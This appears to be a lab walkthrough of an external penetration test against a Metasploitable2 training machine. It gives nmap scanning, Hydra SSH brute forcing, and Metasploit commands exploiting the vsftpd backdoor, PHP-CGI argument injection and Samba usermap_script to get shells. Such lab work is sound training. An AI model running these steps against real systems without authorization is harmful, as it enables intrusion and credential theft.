# External Penetration Test Methodology

## Start With an Nmap Scan

### Exploit Vulnerabilities Found in the Scan

We know the IP address of this machine is `10.21.21.11`.

Now we are going to scan this IP address with the Nmap tool. To perform a comprehensive scan:

```bash
nmap -T4 -p- -A 10.21.21.11
```

**Explanation:**
- `-T4`: Sets the speed to a moderate-fast level.
- `-p-`: Ensures all ports are scanned.
- `-A`: Provides detailed information about the target, including OS, services, and versions.

![image](https://github.com/user-attachments/assets/4cee477c-c968-4b31-adc7-f3827b50c822)
![image](https://github.com/user-attachments/assets/55d36441-7359-4d39-90e3-b36a2ab0ef25)
![image](https://github.com/user-attachments/assets/22e75d96-ff40-4a1c-9850-ec6224e59f56)
![image](https://github.com/user-attachments/assets/171cfe96-40e0-41b2-acae-336c923a73e6)

We can see that there are a lot of open ports, so we are going to exploit them.

### 1. Port 21 (FTP) - Exploiting FTP through Metasploit Framework

As we know, the FTP version is `vsftpd`.

1. Open `msfconsole` and search for `vsftpd Backdoor exploit`.
2. Follow the steps given below to exploit through Metasploit Framework:

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST <target IP address>
exploit
```

![vsftpd exploit](https://github.com/user-attachments/assets/5dd9d633-4a26-4785-8cbf-d708cc91d02e)

We got the shell.

### 2. Port 22 (SSH) - Brute Force with Hydra Tool

We can brute force the service and get the credentials by cracking the username and password.

```bash
hydra -L /path/to/username/list -P /path/to/password/list 10.21.21.11 ssh
```

![Hydra SSH brute force](https://github.com/user-attachments/assets/00ef07ce-4ae9-448b-8108-94f173365ff4)

### 3. Port 23 (Telnet) - Use Telnet Tool

Telnet grabbed the metasploitable2 system’s banner. We have a username and password, so use it to log in to the system:

```bash
telnet <target IP address>
```

![Telnet login](https://github.com/user-attachments/assets/b254d362-97e5-4a5a-9cea-f52a46f916e8)

### 4. Port 80 (PHP_CGI)

Through Nmap, we understood that this port provides an HTTP service. When we run `ip:80` as a URL in the browser and use Wappalyzer, we can see the technologies used. One of the technologies used is PHP 5.2.4, and from researching, we find that this version has an argument injection vulnerability.

**Reference:** [Rapid7 PHP CGI Argument Injection](https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection/)

![PHP CGI vulnerability](https://github.com/user-attachments/assets/cb0cdfa3-c00c-4130-afa6-6bdacfaa5406)

![Wappalyzer PHP](https://github.com/user-attachments/assets/846b6a46-02c2-45d4-9d25-64bd5bbee921)

```bash
msfconsole
use exploit/multi/http/php_cgi_arg_injection
options
set RHOSTS <target IP>
exploit
```

![PHP CGI exploit](https://github.com/user-attachments/assets/7cec01c5-03a9-4f20-a46a-433fbd0fc83c)

### 5. Port 139 & 443 (Samba)

We will exploit this with the Metasploit Framework.

```bash
search usermap_script
use exploit/multi/samba/usermap_script
set RHOST <target IP>
exploit
```

![Samba exploit](https://github.com/user-attachments/assets/d5afa31e-f3e1-4a9a-9aff-ea7b7494819b)
